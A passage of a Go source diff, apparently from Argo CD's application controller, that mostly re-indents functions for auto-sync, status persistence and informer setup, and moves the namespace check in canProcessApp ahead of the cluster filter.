appv1.ApplicationConditionUnknownError,\n-\t\t\t\tMessage: err.Error(),\n-\t\t\t})\n-\t\t} else {\n-\t\t\terrorConditions = append(errorConditions, specConditions...)\n-\t\t}\n-\t}\n-\tapp.Status.SetConditions(errorConditions, map[appv1.ApplicationConditionType]bool{\n-\t\tappv1.ApplicationConditionInvalidSpecError: true,\n-\t\tappv1.ApplicationConditionUnknownError:     true,\n-\t})\n-\treturn proj, len(errorConditions) > 0\n+        errorConditions := make([]appv1.ApplicationCondition, 0)\n+        proj, err := ctrl.getAppProj(app)\n+        if err != nil {\n+                errorConditions = append(errorConditions, ctrl.projectErrorToCondition(err, app))\n+        } else {\n+                specConditions, err := argo.ValidatePermissions(context.Background(), &app.Spec, proj, ctrl.db)\n+                if err != nil {\n+                        errorConditions = append(errorConditions, appv1.ApplicationCondition{\n+                                Type:    appv1.ApplicationConditionUnknownError,\n+                                Message: err.Error(),\n+                        })\n+                } else {\n+                        errorConditions = append(errorConditions, specConditions...)\n+                }\n+        }\n+        app.Status.SetConditions(errorConditions, map[appv1.ApplicationConditionType]bool{\n+                appv1.ApplicationConditionInvalidSpecError: true,\n+                appv1.ApplicationConditionUnknownError:     true,\n+        })\n+        return proj, len(errorConditions) > 0\n }\n \n // normalizeApplication normalizes an application.spec and additionally persists updates if it changed\n func (ctrl *ApplicationController) normalizeApplication(orig, app *appv1.Application) {\n-\tlogCtx := log.WithFields(log.Fields{\"application\": app.QualifiedName()})\n-\tapp.Spec = *argo.NormalizeApplicationSpec(&app.Spec)\n-\n-\tpatch, modified, err := diff.CreateTwoWayMergePatch(orig, app, appv1.Application{})\n-\n-\tif err != nil {\n-\t\tlogCtx.Errorf(\"error constructing app spec patch: %v\", err)\n-\t} else if modified {\n-\t\tappClient := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace)\n-\t\t_, err = appClient.Patch(context.Background(), app.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n-\t\tif err != nil {\n-\t\t\tlogCtx.Errorf(\"Error persisting normalized application spec: %v\", err)\n-\t\t} else {\n-\t\t\tlogCtx.Infof(\"Normalized app spec: %s\", string(patch))\n-\t\t}\n-\t}\n+        logCtx := log.WithFields(log.Fields{\"application\": app.QualifiedName()})\n+        app.Spec = *argo.NormalizeApplicationSpec(&app.Spec)\n+\n+        patch, modified, err := diff.CreateTwoWayMergePatch(orig, app, appv1.Application{})\n+\n+        if err != nil {\n+                logCtx.Errorf(\"error constructing app spec patch: %v\", err)\n+        } else if modified {\n+                appClient := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace)\n+                _, err = appClient.Patch(context.Background(), app.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n+                if err != nil {\n+                        logCtx.Errorf(\"Error persisting normalized application spec: %v\", err)\n+                } else {\n+                        logCtx.Infof(\"Normalized app spec: %s\", string(patch))\n+                }\n+        }\n }\n \n // persistAppStatus persists updates to application status. If no changes were made, it is a no-op\n func (ctrl *ApplicationController) persistAppStatus(orig *appv1.Application, newStatus *appv1.ApplicationStatus) {\n-\tlogCtx := log.WithFields(log.Fields{\"application\": orig.QualifiedName()})\n-\tif orig.Status.Sync.Status != newStatus.Sync.Status {\n-\t\tmessage := fmt.Sprintf(\"Updated sync status: %s -> %s\", orig.Status.Sync.Status, newStatus.Sync.Status)\n-\t\tctrl.auditLogger.LogAppEvent(orig, argo.EventInfo{Reason: argo.EventReasonResourceUpdated, Type: v1.EventTypeNormal}, message)\n-\t}\n-\tif orig.Status.Health.Status != newStatus.Health.Status {\n-\t\tmessage := fmt.Sprintf(\"Updated health status: %s -> %s\", orig.Status.Health.Status, newStatus.Health.Status)\n-\t\tctrl.auditLogger.LogAppEvent(orig, argo.EventInfo{Reason: argo.EventReasonResourceUpdated, Type: v1.EventTypeNormal}, message)\n-\t}\n-\tvar newAnnotations map[string]string\n-\tif orig.GetAnnotations() != nil {\n-\t\tnewAnnotations = make(map[string]string)\n-\t\tfor k, v := range orig.GetAnnotations() {\n-\t\t\tnewAnnotations[k] = v\n-\t\t}\n-\t\tdelete(newAnnotations, appv1.AnnotationKeyRefresh)\n-\t}\n-\tpatch, modified, err := diff.CreateTwoWayMergePatch(\n-\t\t&appv1.Application{ObjectMeta: metav1.ObjectMeta{Annotations: orig.GetAnnotations()}, Status: orig.Status},\n-\t\t&appv1.Application{ObjectMeta: metav1.ObjectMeta{Annotations: newAnnotations}, Status: *newStatus}, appv1.Application{})\n-\tif err != nil {\n-\t\tlogCtx.Errorf(\"Error constructing app status patch: %v\", err)\n-\t\treturn\n-\t}\n-\tif !modified {\n-\t\tlogCtx.Infof(\"No status changes. Skipping patch\")\n-\t\treturn\n-\t}\n-\tappClient := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(orig.Namespace)\n-\t_, err = appClient.Patch(context.Background(), orig.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n-\tif err != nil {\n-\t\tlogCtx.Warnf(\"Error updating application: %v\", err)\n-\t} else {\n-\t\tlogCtx.Infof(\"Update successful\")\n-\t}\n+        logCtx := log.WithFields(log.Fields{\"application\": orig.QualifiedName()})\n+        if orig.Status.Sync.Status != newStatus.Sync.Status {\n+                message := fmt.Sprintf(\"Updated sync status: %s -> %s\", orig.Status.Sync.Status, newStatus.Sync.Status)\n+                ctrl.auditLogger.LogAppEvent(orig, argo.EventInfo{Reason: argo.EventReasonResourceUpdated, Type: v1.EventTypeNormal}, message)\n+        }\n+        if orig.Status.Health.Status != newStatus.Health.Status {\n+                message := fmt.Sprintf(\"Updated health status: %s -> %s\", orig.Status.Health.Status, newStatus.Health.Status)\n+                ctrl.auditLogger.LogAppEvent(orig, argo.EventInfo{Reason: argo.EventReasonResourceUpdated, Type: v1.EventTypeNormal}, message)\n+        }\n+        var newAnnotations map[string]string\n+        if orig.GetAnnotations() != nil {\n+                newAnnotations = make(map[string]string)\n+                for k, v := range orig.GetAnnotations() {\n+                        newAnnotations[k] = v\n+                }\n+                delete(newAnnotations, appv1.AnnotationKeyRefresh)\n+        }\n+        patch, modified, err := diff.CreateTwoWayMergePatch(\n+                &appv1.Application{ObjectMeta: metav1.ObjectMeta{Annotations: orig.GetAnnotations()}, Status: orig.Status},\n+                &appv1.Application{ObjectMeta: metav1.ObjectMeta{Annotations: newAnnotations}, Status: *newStatus}, appv1.Application{})\n+        if err != nil {\n+                logCtx.Errorf(\"Error constructing app status patch: %v\", err)\n+                return\n+        }\n+        if !modified {\n+                logCtx.Infof(\"No status changes. Skipping patch\")\n+                return\n+        }\n+        appClient := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(orig.Namespace)\n+        _, err = appClient.Patch(context.Background(), orig.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n+        if err != nil {\n+                logCtx.Warnf(\"Error updating application: %v\", err)\n+        } else {\n+                logCtx.Infof(\"Update successful\")\n+        }\n }\n \n // autoSync will initiate a sync operation for an application configured with automated sync\n func (ctrl *ApplicationController) autoSync(app *appv1.Application, syncStatus *appv1.SyncStatus, resources []appv1.ResourceStatus) *appv1.ApplicationCondition {\n-\tif app.Spec.SyncPolicy == nil || app.Spec.SyncPolicy.Automated == nil {\n-\t\treturn nil\n-\t}\n-\tlogCtx := log.WithFields(log.Fields{\"application\": app.QualifiedName()})\n-\n-\tif app.Operation != nil {\n-\t\tlogCtx.Infof(\"Skipping auto-sync: another operation is in progress\")\n-\t\treturn nil\n-\t}\n-\tif app.DeletionTimestamp != nil && !app.DeletionTimestamp.IsZero() {\n-\t\tlogCtx.Infof(\"Skipping auto-sync: deletion in progress\")\n-\t\treturn nil\n-\t}\n-\n-\t// Only perform auto-sync if we detect OutOfSync status. This is to prevent us from attempting\n-\t// a sync when application is already in a Synced or Unknown state\n-\tif syncStatus.Status != appv1.SyncStatusCodeOutOfSync {\n-\t\tlogCtx.Infof(\"Skipping auto-sync: application status is %s\", syncStatus.Status)\n-\t\treturn nil\n-\t}\n-\n-\tif !app.Spec.SyncPolicy.Automated.Prune {\n-\t\trequirePruneOnly := true\n-\t\tfor _, r := range resources {\n-\t\t\tif r.Status != appv1.SyncStatusCodeSynced && !r.RequiresPruning {\n-\t\t\t\trequirePruneOnly = false\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\t\tif requirePruneOnly {\n-\t\t\tlogCtx.Infof(\"Skipping auto-sync: need to prune extra resources only but automated prune is disabled\")\n-\t\t\treturn nil\n-\t\t}\n-\t}\n-\n-\tdesiredCommitSHA := syncStatus.Revision\n-\tdesiredCommitSHAsMS := syncStatus.Revisions\n-\talreadyAttempted, attemptPhase := alreadyAttemptedSync(app, desiredCommitSHA, desiredCommitSHAsMS, app.Spec.HasMultipleSources())\n-\tselfHeal := app.Spec.SyncPolicy.Automated.SelfHeal\n-\top := appv1.Operation{\n-\t\tSync: &appv1.SyncOperation{\n-\t\t\tRevision:    desiredCommitSHA,\n-\t\t\tPrune:       app.Spec.SyncPolicy.Automated.Prune,\n-\t\t\tSyncOptions: app.Spec.SyncPolicy.SyncOptions,\n-\t\t\tRevisions:   desiredCommitSHAsMS,\n-\t\t},\n-\t\tInitiatedBy: appv1.OperationInitiator{Automated: true},\n-\t\tRetry:       appv1.RetryStrategy{Limit: 5},\n-\t}\n-\tif app.Spec.SyncPolicy.Retry != nil {\n-\t\top.Retry = *app.Spec.SyncPolicy.Retry\n-\t}\n-\t// It is possible for manifests to remain OutOfSync even after a sync/kubectl apply (e.g.\n-\t// auto-sync with pruning disabled). We need to ensure that we do not keep Syncing an\n-\t// application in an infinite loop. To detect this, we only attempt the Sync if the revision\n-\t// and parameter overrides are different from our most recent sync operation.\n-\tif alreadyAttempted && (!selfHeal || !attemptPhase.Successful()) {\n-\t\tif !attemptPhase.Successful() {\n-\t\t\tlogCtx.Warnf(\"Skipping auto-sync: failed previous sync attempt to %s\", desiredCommitSHA)\n-\t\t\tmessage := fmt.Sprintf(\"Failed sync attempt to %s: %s\", desiredCommitSHA, app.Status.OperationState.Message)\n-\t\t\treturn &appv1.ApplicationCondition{Type: appv1.ApplicationConditionSyncError, Message: message}\n-\t\t}\n-\t\tlogCtx.Infof(\"Skipping auto-sync: most recent sync already to %s\", desiredCommitSHA)\n-\t\treturn nil\n-\t} else if alreadyAttempted && selfHeal {\n-\t\tif shouldSelfHeal, retryAfter := ctrl.shouldSelfHeal(app); shouldSelfHeal {\n-\t\t\tfor _, resource := range resources {\n-\t\t\t\tif resource.Status != appv1.SyncStatusCodeSynced {\n-\t\t\t\t\top.Sync.Resources = append(op.Sync.Resources, appv1.SyncOperationResource{\n-\t\t\t\t\t\tKind:  resource.Kind,\n-\t\t\t\t\t\tGroup: resource.Group,\n-\t\t\t\t\t\tName:  resource.Name,\n-\t\t\t\t\t})\n-\t\t\t\t}\n-\t\t\t}\n-\t\t} else {\n-\t\t\tlogCtx.Infof(\"Skipping auto-sync: already attempted sync to %s with timeout %v (retrying in %v)\", desiredCommitSHA, ctrl.selfHealTimeout, retryAfter)\n-\t\t\tctrl.requestAppRefresh(app.QualifiedName(), CompareWithLatest.Pointer(), &retryAfter)\n-\t\t\treturn nil\n-\t\t}\n-\n-\t}\n-\n-\tif app.Spec.SyncPolicy.Automated.Prune && !app.Spec.SyncPolicy.Automated.AllowEmpty {\n-\t\tbAllNeedPrune := true\n-\t\tfor _, r := range resources {\n-\t\t\tif !r.RequiresPruning {\n-\t\t\t\tbAllNeedPrune = false\n-\t\t\t}\n-\t\t}\n-\t\tif bAllNeedPrune {\n-\t\t\tmessage := fmt.Sprintf(\"Skipping sync attempt to %s: auto-sync will wipe out all resources\", desiredCommitSHA)\n-\t\t\tlogCtx.Warnf(message)\n-\t\t\treturn &appv1.ApplicationCondition{Type: appv1.ApplicationConditionSyncError, Message: message}\n-\t\t}\n-\t}\n-\tappIf := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace)\n-\t_, err := argo.SetAppOperation(appIf, app.Name, &op)\n-\tif err != nil {\n-\t\tlogCtx.Errorf(\"Failed to initiate auto-sync to %s: %v\", desiredCommitSHA, err)\n-\t\treturn &appv1.ApplicationCondition{Type: appv1.ApplicationConditionSyncError, Message: err.Error()}\n-\t}\n-\tmessage := fmt.Sprintf(\"Initiated automated sync to '%s'\", desiredCommitSHA)\n-\tctrl.auditLogger.LogAppEvent(app, argo.EventInfo{Reason: argo.EventReasonOperationStarted, Type: v1.EventTypeNormal}, message)\n-\tlogCtx.Info(message)\n-\treturn nil\n+        if app.Spec.SyncPolicy == nil || app.Spec.SyncPolicy.Automated == nil {\n+                return nil\n+        }\n+        logCtx := log.WithFields(log.Fields{\"application\": app.QualifiedName()})\n+\n+        if app.Operation != nil {\n+                logCtx.Infof(\"Skipping auto-sync: another operation is in progress\")\n+                return nil\n+        }\n+        if app.DeletionTimestamp != nil && !app.DeletionTimestamp.IsZero() {\n+                logCtx.Infof(\"Skipping auto-sync: deletion in progress\")\n+                return nil\n+        }\n+\n+        // Only perform auto-sync if we detect OutOfSync status. This is to prevent us from attempting\n+        // a sync when application is already in a Synced or Unknown state\n+        if syncStatus.Status != appv1.SyncStatusCodeOutOfSync {\n+                logCtx.Infof(\"Skipping auto-sync: application status is %s\", syncStatus.Status)\n+                return nil\n+        }\n+\n+        if !app.Spec.SyncPolicy.Automated.Prune {\n+                requirePruneOnly := true\n+                for _, r := range resources {\n+                        if r.Status != appv1.SyncStatusCodeSynced && !r.RequiresPruning {\n+                                requirePruneOnly = false\n+                                break\n+                        }\n+                }\n+                if requirePruneOnly {\n+                        logCtx.Infof(\"Skipping auto-sync: need to prune extra resources only but automated prune is disabled\")\n+                        return nil\n+                }\n+        }\n+\n+        desiredCommitSHA := syncStatus.Revision\n+        desiredCommitSHAsMS := syncStatus.Revisions\n+        alreadyAttempted, attemptPhase := alreadyAttemptedSync(app, desiredCommitSHA, desiredCommitSHAsMS, app.Spec.HasMultipleSources())\n+        selfHeal := app.Spec.SyncPolicy.Automated.SelfHeal\n+        op := appv1.Operation{\n+                Sync: &appv1.SyncOperation{\n+                        Revision:    desiredCommitSHA,\n+                        Prune:       app.Spec.SyncPolicy.Automated.Prune,\n+                        SyncOptions: app.Spec.SyncPolicy.SyncOptions,\n+                        Revisions:   desiredCommitSHAsMS,\n+                },\n+                InitiatedBy: appv1.OperationInitiator{Automated: true},\n+                Retry:       appv1.RetryStrategy{Limit: 5},\n+        }\n+        if app.Spec.SyncPolicy.Retry != nil {\n+                op.Retry = *app.Spec.SyncPolicy.Retry\n+        }\n+        // It is possible for manifests to remain OutOfSync even after a sync/kubectl apply (e.g.\n+        // auto-sync with pruning disabled). We need to ensure that we do not keep Syncing an\n+        // application in an infinite loop. To detect this, we only attempt the Sync if the revision\n+        // and parameter overrides are different from our most recent sync operation.\n+        if alreadyAttempted && (!selfHeal || !attemptPhase.Successful()) {\n+                if !attemptPhase.Successful() {\n+                        logCtx.Warnf(\"Skipping auto-sync: failed previous sync attempt to %s\", desiredCommitSHA)\n+                        message := fmt.Sprintf(\"Failed sync attempt to %s: %s\", desiredCommitSHA, app.Status.OperationState.Message)\n+                        return &appv1.ApplicationCondition{Type: appv1.ApplicationConditionSyncError, Message: message}\n+                }\n+                logCtx.Infof(\"Skipping auto-sync: most recent sync already to %s\", desiredCommitSHA)\n+                return nil\n+        } else if alreadyAttempted && selfHeal {\n+                if shouldSelfHeal, retryAfter := ctrl.shouldSelfHeal(app); shouldSelfHeal {\n+                        for _, resource := range resources {\n+                                if resource.Status != appv1.SyncStatusCodeSynced {\n+                                        op.Sync.Resources = append(op.Sync.Resources, appv1.SyncOperationResource{\n+                                                Kind:  resource.Kind,\n+                                                Group: resource.Group,\n+                                                Name:  resource.Name,\n+                                        })\n+                                }\n+                        }\n+                } else {\n+                        logCtx.Infof(\"Skipping auto-sync: already attempted sync to %s with timeout %v (retrying in %v)\", desiredCommitSHA, ctrl.selfHealTimeout, retryAfter)\n+                        ctrl.requestAppRefresh(app.QualifiedName(), CompareWithLatest.Pointer(), &retryAfter)\n+                        return nil\n+                }\n+\n+        }\n+\n+        if app.Spec.SyncPolicy.Automated.Prune && !app.Spec.SyncPolicy.Automated.AllowEmpty {\n+                bAllNeedPrune := true\n+                for _, r := range resources {\n+                        if !r.RequiresPruning {\n+                                bAllNeedPrune = false\n+                        }\n+                }\n+                if bAllNeedPrune {\n+                        message := fmt.Sprintf(\"Skipping sync attempt to %s: auto-sync will wipe out all resources\", desiredCommitSHA)\n+                        logCtx.Warnf(message)\n+                        return &appv1.ApplicationCondition{Type: appv1.ApplicationConditionSyncError, Message: message}\n+                }\n+        }\n+        appIf := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace)\n+        _, err := argo.SetAppOperation(appIf, app.Name, &op)\n+        if err != nil {\n+                logCtx.Errorf(\"Failed to initiate auto-sync to %s: %v\", desiredCommitSHA, err)\n+                return &appv1.ApplicationCondition{Type: appv1.ApplicationConditionSyncError, Message: err.Error()}\n+        }\n+        message := fmt.Sprintf(\"Initiated automated sync to '%s'\", desiredCommitSHA)\n+        ctrl.auditLogger.LogAppEvent(app, argo.EventInfo{Reason: argo.EventReasonOperationStarted, Type: v1.EventTypeNormal}, message)\n+        logCtx.Info(message)\n+        return nil\n }\n \n // alreadyAttemptedSync returns whether or not the most recent sync was performed against the\n // commitSHA and with the same app source config which are currently set in the app\n func alreadyAttemptedSync(app *appv1.Application, commitSHA string, commitSHAsMS []string, hasMultipleSources bool) (bool, synccommon.OperationPhase) {\n-\tif app.Status.OperationState == nil || app.Status.OperationState.Operation.Sync == nil || app.Status.OperationState.SyncResult == nil {\n-\t\treturn false, \"\"\n-\t}\n-\tif hasMultipleSources {\n-\t\tif !reflect.DeepEqual(app.Status.OperationState.SyncResult.Revisions, commitSHAsMS) {\n-\t\t\treturn false, \"\"\n-\t\t}\n-\t} else {\n-\t\tif app.Status.OperationState.SyncResult.Revision != commitSHA {\n-\t\t\treturn false, \"\"\n-\t\t}\n-\t}\n-\n-\tif hasMultipleSources {\n-\t\t// Ignore differences in target revision, since we already just verified commitSHAs are equal,\n-\t\t// and we do not want to trigger auto-sync due to things like HEAD != master\n-\t\tspecSources := app.Spec.Sources.DeepCopy()\n-\t\tsyncSources := app.Status.OperationState.SyncResult.Sources.DeepCopy()\n-\t\tfor _, source := range specSources {\n-\t\t\tsource.TargetRevision = \"\"\n-\t\t}\n-\t\tfor _, source := range syncSources {\n-\t\t\tsource.TargetRevision = \"\"\n-\t\t}\n-\t\treturn reflect.DeepEqual(app.Spec.Sources, app.Status.OperationState.SyncResult.Sources), app.Status.OperationState.Phase\n-\t} else {\n-\t\t// Ignore differences in target revision, since we already just verified commitSHAs are equal,\n-\t\t// and we do not want to trigger auto-sync due to things like HEAD != master\n-\t\tspecSource := app.Spec.Source.DeepCopy()\n-\t\tspecSource.TargetRevision = \"\"\n-\t\tsyncResSource := app.Status.OperationState.SyncResult.Source.DeepCopy()\n-\t\tsyncResSource.TargetRevision = \"\"\n-\t\treturn reflect.DeepEqual(app.Spec.GetSource(), app.Status.OperationState.SyncResult.Source), app.Status.OperationState.Phase\n-\t}\n+        if app.Status.OperationState == nil || app.Status.OperationState.Operation.Sync == nil || app.Status.OperationState.SyncResult == nil {\n+                return false, \"\"\n+        }\n+        if hasMultipleSources {\n+                if !reflect.DeepEqual(app.Status.OperationState.SyncResult.Revisions, commitSHAsMS) {\n+                        return false, \"\"\n+                }\n+        } else {\n+                if app.Status.OperationState.SyncResult.Revision != commitSHA {\n+                        return false, \"\"\n+                }\n+        }\n+\n+        if hasMultipleSources {\n+                // Ignore differences in target revision, since we already just verified commitSHAs are equal,\n+                // and we do not want to trigger auto-sync due to things like HEAD != master\n+                specSources := app.Spec.Sources.DeepCopy()\n+                syncSources := app.Status.OperationState.SyncResult.Sources.DeepCopy()\n+                for _, source := range specSources {\n+                        source.TargetRevision = \"\"\n+                }\n+                for _, source := range syncSources {\n+                        source.TargetRevision = \"\"\n+                }\n+                return reflect.DeepEqual(app.Spec.Sources, app.Status.OperationState.SyncResult.Sources), app.Status.OperationState.Phase\n+        } else {\n+                // Ignore differences in target revision, since we already just verified commitSHAs are equal,\n+                // and we do not want to trigger auto-sync due to things like HEAD != master\n+                specSource := app.Spec.Source.DeepCopy()\n+                specSource.TargetRevision = \"\"\n+                syncResSource := app.Status.OperationState.SyncResult.Source.DeepCopy()\n+                syncResSource.TargetRevision = \"\"\n+                return reflect.DeepEqual(app.Spec.GetSource(), app.Status.OperationState.SyncResult.Source), app.Status.OperationState.Phase\n+        }\n }\n \n func (ctrl *ApplicationController) shouldSelfHeal(app *appv1.Application) (bool, time.Duration) {\n-\tif app.Status.OperationState == nil {\n-\t\treturn true, time.Duration(0)\n-\t}\n-\n-\tvar retryAfter time.Duration\n-\tif app.Status.OperationState.FinishedAt == nil {\n-\t\tretryAfter = ctrl.selfHealTimeout\n-\t} else {\n-\t\tretryAfter = ctrl.selfHealTimeout - time.Since(app.Status.OperationState.FinishedAt.Time)\n-\t}\n-\treturn retryAfter <= 0, retryAfter\n+        if app.Status.OperationState == nil {\n+                return true, time.Duration(0)\n+        }\n+\n+        var retryAfter time.Duration\n+        if app.Status.OperationState.FinishedAt == nil {\n+                retryAfter = ctrl.selfHealTimeout\n+        } else {\n+                retryAfter = ctrl.selfHealTimeout - time.Since(app.Status.OperationState.FinishedAt.Time)\n+        }\n+        return retryAfter <= 0, retryAfter\n }\n \n func (ctrl *ApplicationController) canProcessApp(obj interface{}) bool {\n-\tapp, ok := obj.(*appv1.Application)\n-\tif !ok {\n-\t\treturn false\n-\t}\n-\tif ctrl.clusterFilter != nil {\n-\t\tcluster, err := ctrl.db.GetCluster(context.Background(), app.Spec.Destination.Server)\n-\t\tif err != nil {\n-\t\t\treturn ctrl.clusterFilter(nil)\n-\t\t}\n-\t\treturn ctrl.clusterFilter(cluster)\n-\t}\n-\n-\t// Only process given app if it exists in a watched namespace, or in the\n-\t// control plane's namespace.\n-\tif app.Namespace != ctrl.namespace && !glob.MatchStringInList(ctrl.applicationNamespaces, app.Namespace, false) {\n-\t\treturn false\n-\t}\n-\n-\treturn true\n+        app, ok := obj.(*appv1.Application)\n+        if !ok {\n+                return false\n+        }\n+        // Only process given app if it exists in a watched namespace, or in the\n+        // control plane's namespace.\n+        if app.Namespace != ctrl.namespace && !glob.MatchStringInList(ctrl.applicationNamespaces, app.Namespace, false) {\n+                return false\n+        }\n+\n+        if ctrl.clusterFilter != nil {\n+                cluster, err := ctrl.db.GetCluster(context.Background(), app.Spec.Destination.Server)\n+                if err != nil {\n+                        return ctrl.clusterFilter(nil)\n+                }\n+                return ctrl.clusterFilter(cluster)\n+        }\n+\n+        return true\n }\n \n func (ctrl *ApplicationController) newApplicationInformerAndLister() (cache.SharedIndexInformer, applisters.ApplicationLister) {\n-\twatchNamespace := ctrl.namespace\n-\t// If we have at least one additional namespace configured, we need to\n-\t// watch on them all.\n-\tif len(ctrl.applicationNamespaces) > 0 {\n-\t\twatchNamespace = \"\"\n-\t}\n-\trefreshTimeout := ctrl.statusRefreshTimeout\n-\tif ctrl.statusHardRefreshTimeout.Seconds() != 0 && (ctrl.statusHardRefreshTimeout < ctrl.statusRefreshTimeout) {\n-\t\trefreshTimeout = ctrl.statusHardRefreshTimeout\n-\t}\n-\tinformer := cache.NewSharedIndexInformer(\n-\t\t&cache.ListWatch{\n-\t\t\tListFunc: func(options metav1.ListOptions) (apiruntime.Object, error) {\n-\t\t\t\t// We are only interested in apps that exist in namespaces the\n-\t\t\t\t// user wants to be enabled.\n-\t\t\t\tappList, err := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(watchNamespace).List(context.TODO(), options)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn nil, err\n-\t\t\t\t}\n-\t\t\t\tnewItems := []appv1.Application{}\n-\t\t\t\tfor _, app := range appList.Items {\n-\t\t\t\t\tif ctrl.namespace == app.Namespace || glob.MatchStringInList(ctrl.applicationNamespaces, app.Namespace, false) {\n-\t\t\t\t\t\tnewItems = append(newItems, app)\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\tappList.Items = newItems\n-\t\t\t\treturn appList, nil\n-\t\t\t},\n-\t\t\tWatchFunc: func(options metav1.ListOptions) (watch.Interface, error) {\n-\t\t\t\treturn ctrl.applicationClientset.ArgoprojV1alpha1().Applications(watchNamespace).Watch(context.TODO(), options)\n-\t\t\t},\n-\t\t},\n-\t\t&appv1.Application{},\n-\t\trefreshTimeout,\n-\t\tcache.Indexers{\n-\t\t\tcache.NamespaceIndex: func(obj interface{}) ([]string, error) {\n-\t\t\t\tapp, ok := obj.(*appv1.Application)\n-\t\t\t\tif ok {\n-\t\t\t\t\t// This call to 'ValidateDestination' ensures that the .spec.destination field of all Applications\n-\t\t\t\t\t// returned by the informer/lister will have server field set (if not already set) based on the name.\n-\t\t\t\t\t// (or, if not found, an error app condition)\n-\n-\t\t\t\t\t// If the server field is not set, set it based on the cluster name; if the cluster name can't be found,\n-\t\t\t\t\t// log an error as an App Condition.\n-\t\t\t\t\tif err := argo.ValidateDestination(context.Background(), &app.Spec.Destination, ctrl.db); err != nil {\n-\t\t\t\t\t\tctrl.setAppCondition(app, appv1.ApplicationCondition{Type: appv1.ApplicationConditionInvalidSpecError, Message: err.Error()})\n-\t\t\t\t\t}\n-\n-\t\t\t\t\t// If the application is not allowed to use the project,\n-\t\t\t\t\t// log an error.\n-\t\t\t\t\tif _, err := ctrl.getAppProj(app); err != nil {\n-\t\t\t\t\t\tctrl.setAppCondition(app, ctrl.projectErrorToCondition(err, app))\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\n-\t\t\t\treturn cache.MetaNamespaceIndexFunc(obj)\n-\t\t\t},\n-\t\t\torphanedIndex: func(obj interface{}) (i []string, e error) {\n-\t\t\t\tapp, ok := obj.(*appv1.Application)\n-\t\t\t\tif !ok {\n-\t\t\t\t\treturn nil, nil\n-\t\t\t\t}\n-\n-\t\t\t\tproj, err := applisters.NewAppProjectLister(ctrl.projInformer.GetIndexer()).AppProjects(ctrl.namespace).Get(app.Spec.GetProject())\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn nil, nil\n-\t\t\t\t}\n-\t\t\t\tif proj.Spec.OrphanedResources != nil {\n-\t\t\t\t\treturn []string{app.Spec.Destination.Namespace}, nil\n-\t\t\t\t}\n-\t\t\t\treturn nil, nil\n-\t\t\t},\n-\t\t},\n-\t)\n-\tlister := applisters.NewApplicationLister(informer.GetIndexer())\n-\tinformer.AddEventHandler(\n-\t\tcache.ResourceEventHandlerFuncs{\n-\t\t\tAddFunc: func(obj interface{}) {\n-\t\t\t\tif !ctrl.canProcessApp(obj) {\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\tkey, err := cache.MetaNamespaceKeyFunc(obj)\n-\t\t\t\tif err == nil {\n-\t\t\t\t\tctrl.appRefreshQueue.Add(key)\n-\t\t\t\t\tctrl.appOperationQueue.Add(key)\n-\t\t\t\t}\n-\t\t\t},\n-\t\t\tUpdateFunc: func(old, new interface{}) {\n-\t\t\t\tif !ctrl.canProcessApp(new) {\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\n-\t\t\t\tkey, err := cache.MetaNamespaceKeyFunc(new)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\tvar compareWith *CompareWith\n-\t\t\t\toldApp, oldOK := old.(*appv1.Application)\n-\t\t\t\tnewApp, newOK := new.(*appv1.Application)\n-\t\t\t\tif oldOK && newOK && automatedSyncEnabled(oldApp, newApp) {\n-\t\t\t\t\tlog.WithField(\"application\", newApp.QualifiedName()).Info(\"Enabled automated sync\")\n-\t\t\t\t\tcompareWith = CompareWithLatest.Pointer()\n-\t\t\t\t}\n-\t\t\t\tctrl.requestAppRefresh(newApp.QualifiedName(), compareWith, nil)\n-\t\t\t\tctrl.appOperationQueue.Add(key)\n-\t\t\t},\n-\t\t\tDeleteFunc: func(obj interface{}) {\n-\t\t\t\tif !ctrl.canProcessApp(obj) {\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\t// IndexerInformer uses a delta queue, therefore for deletes we have to use this\n-\t\t\t\t// key function.\n-\t\t\t\tkey, err := cache.DeletionHandlingMetaNamespaceKeyFunc(obj)\n-\t\t\t\tif err == nil {\n-\t\t\t\t\tctrl.appRefreshQueue.Add(key)\n-\t\t\t\t}\n-\t\t\t},\n-\t\t},\n-\t)\n-\treturn informer, lister\n+        watchNamespace := ctrl.namespace\n+        // If we have at least one additional namespace configured, we need to\n+        // watch on them all.\n+        if len(ctrl.applicationNamespaces) > 0 {\n+                watchNamespace = \"\"\n+        }\n+        refreshTimeout := ctrl.statusRefreshTimeout\n+        if ctrl.statusHardRefreshTimeout.Seconds() != 0 && (ctrl.statusHardRefreshTimeout < ctrl.statusRefreshTimeout) {\n+                refreshTimeout = ctrl.statusHardRefreshTimeout\n+        }\n+        informer := cache.NewSharedIndexInformer(\n+                &cache.ListWatch{\n+                        ListFunc: func(options metav1.ListOptions) (apiruntime.Object, error) {\n+                                // We are only interested in apps that exist in namespaces the\n+                                // user wants to be enabled.\n+                                appList, err := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(watchNamespace).List(context.TODO(), options)\n+                                if err != nil {\n+                                        return nil, err\n+                                }\n+                                newItems := []appv1.Application{}\n+                                for _, app := range appList.Items {\n+                                        if ctrl.namespace == app.Namespace || glob.MatchStringInList(ctrl.applicationNamespaces, app.Namespace, false) {\n+                                                newItems = append(newItems, app)\n+                                        }\n+                                }\n+                                appList.Items = newItems\n+                                return appList, nil\n+                        },\n+                        WatchFunc: func(options metav1.ListOptions) (watch.Interface, error) {\n+                                return 